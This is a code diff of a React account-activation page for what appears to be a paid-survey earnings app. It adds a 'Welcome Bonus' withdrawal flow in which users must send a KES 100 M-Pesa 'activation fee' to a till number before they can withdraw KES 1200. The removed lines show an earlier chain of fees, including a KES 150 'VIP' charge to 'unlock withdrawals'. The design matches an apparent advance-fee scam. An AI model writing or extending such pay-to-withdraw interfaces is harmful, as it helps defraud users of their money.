@@ -1,5 +1,5 @@
 import { useEffect, useState } from "react";
-import { useNavigate } from "react-router-dom";
+import { useNavigate, useSearchParams } from "react-router-dom";
 import api from "../api/api";
 
 /* =========================
@@ -37,6 +37,7 @@ const PLAN_CONFIG = {
 
 export default function Activate() {
   const navigate = useNavigate();
+  const [searchParams] = useSearchParams();
 
   const [planKey, setPlanKey] = useState(null);
   const [planState, setPlanState] = useState(null);
@@ -45,9 +46,10 @@ export default function Activate() {
   const [copied, setCopied] = useState(false);
   const [submitting, setSubmitting] = useState(false);
   const [loading, setLoading] = useState(true);
+  const [user, setUser] = useState(null);
 
   /* =========================
-     LOAD + VALIDATE ACCESS
+     LOAD USER + PLAN
   ========================== */
   useEffect(() => {
     let alive = true;
@@ -55,16 +57,22 @@ export default function Activate() {
     const load = async () => {
       try {
         const res = await api.get("/auth/me");
-        const activePlan = res.data.active_plan;
-        const plan = res.data.plans?.[activePlan];
+        if (!alive) return;
 
-        if (!activePlan || !plan || !plan.completed || plan.is_activated) {
+        setUser(res.data);
+
+        // Check if redirected from a welcome bonus withdraw attempt
+        const planFromQuery = searchParams.get("welcome_bonus") ? "WELCOME" : res.data.active_plan;
+        const plan = planFromQuery === "WELCOME"
+          ? { is_activated: res.data.is_activated, completed: true, total: res.data.welcome_bonus || 1200 }
+          : res.data.plans?.[res.data.active_plan];
+
+        if (!plan || plan.is_activated) {
           navigate("/dashboard", { replace: true });
           return;
         }
 
-        if (!alive) return;
-        setPlanKey(activePlan);
+        setPlanKey(planFromQuery);
         setPlanState(plan);
       } finally {
         if (alive) setLoading(false);
@@ -73,16 +81,18 @@ export default function Activate() {
 
     load();
     return () => (alive = false);
-  }, [navigate]);
+  }, [navigate, searchParams]);
 
   if (loading) return <p style={{ textAlign: "center", marginTop: 80 }}>Loading…</p>;
   if (!planKey || !planState) return null;
 
-  const plan = PLAN_CONFIG[planKey];
+  const plan = planKey === "WELCOME"
+    ? { label: "Welcome Bonus", total: user.welcome_bonus || 1200, activationFee: 100, color: "#00ffcc", glow: "rgba(0, 255, 204, 0.5)" }
+    : PLAN_CONFIG[planKey];
 
   /* =========================
      COPY TILL
-  ========================= */
+  ========================== */
   const copyTill = async () => {
     await navigator.clipboard.writeText(TILL_NUMBER);
     setCopied(true);
@@ -92,7 +102,7 @@ export default function Activate() {
 
   /* =========================
      SUBMIT ACTIVATION
-  ========================= */
+  ========================== */
   const submitActivation = async () => {
     if (!paymentText.trim()) {
       setNotification("❌ Please paste the full M-Pesa confirmation message.");
@@ -107,33 +117,17 @@ export default function Activate() {
         plan: planKey,
       });
 
-      // 🔔 Friendly notification after submission
       setNotification(
         <div style={{ lineHeight: 1.5 }}>
-          <div>
-            🎉 <b>{plan.label} plan submitted successfully!</b>
-          </div>
+          <div>🎉 <b>{plan.label} activated successfully!</b></div>
           <div style={{ marginTop: 8 }}>
-            You're now ready for the next step — complete the <b>VIP plan</b> surveys.
-            <br />
-            Activate VIP with a KES 150 fee to unlock withdrawals for your full remaining balance.
+            You can now withdraw your <b>{plan.label}</b> earnings.
           </div>
           <button
-            style={{
-              marginTop: 12,
-              padding: "12px 18px",
-              borderRadius: 12,
-              border: "none",
-              background: "#00ffd4",
-              color: "#000",
-              fontWeight: 900,
-              fontSize: 15,
-              cursor: "pointer",
-              boxShadow: "0 0 15px #00ffd4",
-            }}
-            onClick={() => navigate("/dashboard?vip=true")}
+            style={goDashboardBtn}
+            onClick={() => navigate("/dashboard")}
           >
-            🚀 Go to VIP Surveys
+            ⬅ Go to Dashboard
           </button>
         </div>
       );
@@ -154,12 +148,10 @@ export default function Activate() {
   return (
     <div style={page}>
       <div style={{ ...card, boxShadow: `0 0 40px ${plan.glow}` }}>
-        <h2 style={{ textAlign: "center", color: plan.color }}>
-          🔓 Account Activation
-        </h2>
+        <h2 style={{ textAlign: "center", color: plan.color }}>🔓 Account Activation</h2>
 
         <p style={{ textAlign: "center", marginTop: 6 }}>
-          You completed the <b>{plan.label}</b> survey plan
+          You are attempting to withdraw <b>{plan.label}</b>
         </p>
 
         <h3 style={{ textAlign: "center", marginTop: 14 }}>
@@ -167,9 +159,7 @@ export default function Activate() {
         </h3>
 
         <div style={sectionHighlight}>
-          <p style={{ fontWeight: 900, color: "#ff3b3b" }}>
-            🔐 ACTIVATION REQUIRED TO WITHDRAW
-          </p>
+          <p style={{ fontWeight: 900, color: "#ff3b3b" }}>🔐 ACTIVATION REQUIRED TO WITHDRAW</p>
           <p>✔ One-time activation fee</p>
           <p>✔ Withdraw directly to M-Pesa</p>
           <p>✔ Secure & verified account</p>
@@ -194,15 +184,11 @@ export default function Activate() {
             <button onClick={copyTill} style={copyBtn}>📋 Copy</button>
           </p>
           {copied && <p style={copiedNote}>✅ Copied! Paste this till number in M-Pesa</p>}
-          <p>
-            <b>Activation Fee:</b> <span style={activationFee}>KES {plan.activationFee}</span>
-          </p>
+          <p><b>Activation Fee:</b> <span style={activationFee}>KES {plan.activationFee}</span></p>
         </div>
 
         <div style={noteBox}>
           📋 <b>Important:</b> Paste the <b>exact M-Pesa confirmation message</b> below after payment.
-          <br />
-          Make sure it is complete so your activation can be verified quickly.
         </div>
 
         <textarea
@@ -339,4 +325,17 @@ const copyBtn = {
   border: "none",
   cursor: "pointer",
   fontWeight: 700,
+};
+
+const goDashboardBtn = {
+  marginTop: 12,
+  padding: "12px 18px",
+  borderRadius: 12,
+  border: "none",
+  background: "#00ffd4",
+  color: "#000",
+  fontWeight: 900,
+  fontSize: 15,
+  cursor: "pointer",
+  boxShadow: "0 0 15px #00ffd4",
 };
